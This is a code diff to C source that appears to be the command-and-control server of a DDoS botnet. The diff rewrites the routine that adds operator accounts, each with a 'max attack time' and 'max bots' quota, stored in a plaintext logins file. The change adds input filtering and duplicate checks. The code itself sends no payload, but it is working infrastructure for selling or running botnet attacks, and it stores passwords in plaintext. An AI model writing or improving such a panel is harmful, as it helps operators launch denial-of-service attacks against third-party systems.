@@ -680,75 +680,137 @@ void handle_adduser_command(const User *user, int client_socket) {
     }
 
     char response[MAX_COMMAND_LENGTH];
-    snprintf(response, sizeof(response), "Select Name: ");
-    send(client_socket, response, strlen(response), 0);
-    
     char buffer[128];
-    int len = recv(client_socket, buffer, sizeof(buffer)-1, 0);
-    if (len <= 0) return;
-    buffer[len] = 0;
-    char newuser[50];
-    sscanf(buffer, "%49s", newuser);
-
-    snprintf(response, sizeof(response), "Select Password: ");
+    char newuser[50] = {0};
+    char newpass[50] = {0};
+    int maxtime = 0;
+    int maxbots = 0;
+    int is_admin = 0;
+    ssize_t len;
+    
+    snprintf(response, sizeof(response), BLUE "Username: " RESET);
     send(client_socket, response, strlen(response), 0);
     
     len = recv(client_socket, buffer, sizeof(buffer)-1, 0);
     if (len <= 0) return;
     buffer[len] = 0;
-    char newpass[50];
-    sscanf(buffer, "%49s", newpass);
 
-    sleep(1);
-    send(client_socket, response, strlen(response), 0);
-    
-    int maxtime, maxbots;
-    char admin[4];
-
-
-    sleep(1);
-    snprintf(response, sizeof(response), "Max time: ");
-    send(client_socket, response, strlen(response), 0);
-    
-    len = recv(client_socket, buffer, sizeof(buffer)-1, 0);
-    if (len <= 0) return;
-    buffer[len] = 0;
-    sscanf(buffer, "%d", &maxtime);
-
-    snprintf(response, sizeof(response), "Max bots: ");
-    send(client_socket, response, strlen(response), 0);
-    
-    len = recv(client_socket, buffer, sizeof(buffer)-1, 0);
-    if (len <= 0) return;
-    buffer[len] = 0;
-    sscanf(buffer, "%d", &maxbots);
-
-    snprintf(response, sizeof(response), "Admin? (yes/no): ");
-    send(client_socket, response, strlen(response), 0);
-    
-    len = recv(client_socket, buffer, sizeof(buffer)-1, 0);
-    if (len <= 0) return;
-    buffer[len] = 0;
-    sscanf(buffer, "%3s", admin);
-
-
-    FILE *f = fopen("database/logins.txt", "a");
-    if (f) {
-        if (strcmp(admin, "yes") == 0) {
-            fprintf(f, "%s %s %d %d admin\n", newuser, newpass, maxtime, maxbots);
-        } else {
-            fprintf(f, "%s %s %d %d\n", newuser, newpass, maxtime, maxbots);
+    int uidx = 0;
+    for (int i = 0; i < len && uidx < 49; i++) {
+        char c = buffer[i];
+        if (c == '\r' || c == '\n') break;
+        if (c >= 'a' && c <= 'z' || c >= 'A' && c <= 'Z' || c >= '0' && c <= '9' || c == '_') {
+            newuser[uidx++] = c;
         }
-        fclose(f);
-        
-        snprintf(response, sizeof(response), 
-                 GREEN "User added!\r\n"
-                 "Username: %s\r\n"
-                 "Password: %s\r\n" RESET,
-                 newuser, newpass);
-    } else {
-        snprintf(response, sizeof(response), RED "Failed to add user\r\n" RESET);
     }
+    newuser[uidx] = 0;
+
+    if (strlen(newuser) < 3) {
+        snprintf(response, sizeof(response), RED "Username must be at least 3 characters (letters, numbers, underscore)\r\n" RESET);
+        send(client_socket, response, strlen(response), 0);
+        return;
+    }
+
+    for (int i = 0; i < user_count; i++) {
+        if (strcmp(users[i].user, newuser) == 0) {
+            snprintf(response, sizeof(response), RED "User already exists\r\n" RESET);
+            send(client_socket, response, strlen(response), 0);
+            return;
+        }
+    }
+
+    snprintf(response, sizeof(response), BLUE "Password: " RESET);
+    send(client_socket, response, strlen(response), 0);
+    
+    len = recv(client_socket, buffer, sizeof(buffer)-1, 0);
+    if (len <= 0) return;
+    buffer[len] = 0;
+
+    int pidx = 0;
+    for (int i = 0; i < len && pidx < 49; i++) {
+        char c = buffer[i];
+        if (c == '\r' || c == '\n') break;
+        if (c >= 32 && c <= 126) {
+            newpass[pidx++] = c;
+        }
+    }
+    newpass[pidx] = 0;
+
+    if (strlen(newpass) < 4) {
+        snprintf(response, sizeof(response), RED "Password must be at least 4 characters\r\n" RESET);
+        send(client_socket, response, strlen(response), 0);
+        return;
+    }
+
+    snprintf(response, sizeof(response), BLUE "Admin (y/n): " RESET);
+    send(client_socket, response, strlen(response), 0);
+    
+    len = recv(client_socket, buffer, sizeof(buffer)-1, 0);
+    if (len <= 0) return;
+    buffer[len] = 0;
+    
+    char admin_choice;
+    for (int i = 0; i < len; i++) {
+        if (buffer[i] == 'y' || buffer[i] == 'Y' || buffer[i] == 'n' || buffer[i] == 'N') {
+            admin_choice = buffer[i];
+            break;
+        }
+    }
+    is_admin = (admin_choice == 'y' || admin_choice == 'Y') ? 1 : 0;
+
+    snprintf(response, sizeof(response), BLUE "Max attack time (seconds): " RESET);
+    send(client_socket, response, strlen(response), 0);
+    
+    len = recv(client_socket, buffer, sizeof(buffer)-1, 0);
+    if (len <= 0) return;
+    buffer[len] = 0;
+    
+    if (sscanf(buffer, "%d", &maxtime) != 1 || maxtime <= 0) {
+        snprintf(response, sizeof(response), RED "Invalid max time value\r\n" RESET);
+        send(client_socket, response, strlen(response), 0);
+        return;
+    }
+
+    snprintf(response, sizeof(response), BLUE "Max bots: " RESET);
+    send(client_socket, response, strlen(response), 0);
+    
+    len = recv(client_socket, buffer, sizeof(buffer)-1, 0);
+    if (len <= 0) return;
+    buffer[len] = 0;
+    
+    if (sscanf(buffer, "%d", &maxbots) != 1 || maxbots <= 0) {
+        snprintf(response, sizeof(response), RED "Invalid max bots value\r\n" RESET);
+        send(client_socket, response, strlen(response), 0);
+        return;
+    }
+
+    FILE *fp = fopen("database/logins.txt", "a");
+    if (!fp) {
+        snprintf(response, sizeof(response), RED "Error: Could not open user database\r\n" RESET);
+        send(client_socket, response, strlen(response), 0);
+        return;
+    }
+    
+    fprintf(fp, "%s %s %d %d %s\n", newuser, newpass, maxtime, maxbots, is_admin ? "admin" : "0");
+    fclose(fp);
+
+    if (user_count < MAX_USERS) {
+        strncpy(users[user_count].user, newuser, sizeof(users[user_count].user)-1);
+        strncpy(users[user_count].pass, newpass, sizeof(users[user_count].pass)-1);
+        users[user_count].maxtime = maxtime;
+        users[user_count].maxbots = maxbots;
+        users[user_count].is_admin = is_admin;
+        users[user_count].is_logged_in = 0;
+        user_count++;
+    }
+
+    snprintf(response, sizeof(response), 
+        BLUE "User added successfully:\r\n"
+        "Username: %s\r\n"
+        "Max time: %d\r\n"
+        "Max bots: %d\r\n"
+        "Admin: %s\r\n" RESET,
+        newuser, maxtime, maxbots, is_admin ? "yes" : "no");
     send(client_socket, response, strlen(response), 0);
 }
 
